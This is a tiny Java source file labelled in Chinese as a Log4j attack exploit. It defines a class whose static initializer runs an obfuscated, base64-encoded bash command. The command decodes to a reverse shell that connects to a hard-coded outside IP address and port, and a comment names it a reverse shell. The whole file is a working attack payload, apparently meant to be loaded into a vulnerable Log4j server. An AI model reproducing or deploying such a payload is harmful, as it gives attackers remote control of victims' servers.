//log4j 攻击EXP
import java.io.IOException;

public class Log4jRCE {
    static {
        try {
            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDIuMTg3LjMxLzM4MzggMD4mMQ==}|{base64,-d}|{bash,-i}");//bash反弹shell
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
